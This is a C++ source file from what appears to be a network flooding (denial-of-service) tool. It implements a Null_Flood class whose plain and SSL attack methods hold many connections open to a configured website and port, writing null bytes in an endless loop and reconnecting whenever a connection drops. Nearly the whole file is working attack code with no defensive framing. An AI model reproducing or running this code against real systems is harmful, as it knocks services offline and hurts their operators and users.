
#include <openssl/ssl.h>
#include <utility>
#include "../Headers/Null_Flood.hpp"

void Null_Flood::attack() {
    int r;
    std::vector<int> sockets;
    sockets.reserve(static_cast<unsigned long>(conf->CONNECTIONS));
    for (int x = 0; x < conf->CONNECTIONS; x++) {
        sockets.emplace_back(0);
    }
    int socktype = conf->protocol;
    while(true) {
        for (int x = 0; x < conf->CONNECTIONS; x++) {
            if(!sockets[x]){
                sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), socktype);
            }
            if((r = write_socket(sockets[x],"\0", 1)) == -1){
                cleanup(&sockets[x]);
                sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), socktype);
            }else{
                if(conf->GetResponse){
                    read_socket(sockets[x]);
                }
                conf->voly++;
            }
        }
        conf->voly++;
        pause();
    }
}

void Null_Flood::attack_ssl() {
    int r;
    std::vector<int> sockets;
    std::vector<SSL_CTX *> CTXs;
    std::vector<SSL *> SSLs;
    sockets.reserve(static_cast<unsigned long>(conf->CONNECTIONS));
    CTXs.reserve(static_cast<unsigned long>(conf->CONNECTIONS));
    SSLs.reserve(static_cast<unsigned long>(conf->CONNECTIONS));
    int socktype = conf->protocol;
    for (int x = 0; x < conf->CONNECTIONS; x++) {
        sockets.emplace_back(0);
        SSLs.emplace_back(nullptr);
        CTXs.emplace_back(nullptr);
    }
    while(true) {
        for (int x = 0; x < conf->CONNECTIONS; x++) {
            if(!sockets[x]){
                sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), socktype);
                CTXs[x] = InitCTX();
                SSLs[x] = Apply_SSL(sockets[x], CTXs[x]);
            }
            if((r = write_socket(SSLs[x], "\0", 1)) == -1){
                cleanup(SSLs[x], &sockets[x], CTXs[x]);
                sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), socktype);
                CTXs[x] = InitCTX();
                SSLs[x] = Apply_SSL(sockets[x], CTXs[x]);
            }else{
                if(conf->GetResponse){
                    read_socket(SSLs[x]);
                }
                conf->voly++;
            }
        }
        conf->voly++;
        pause();
    }
}

Null_Flood::Null_Flood(std::shared_ptr<Config> conf) : Http_Flood(std::move(conf)) {

}
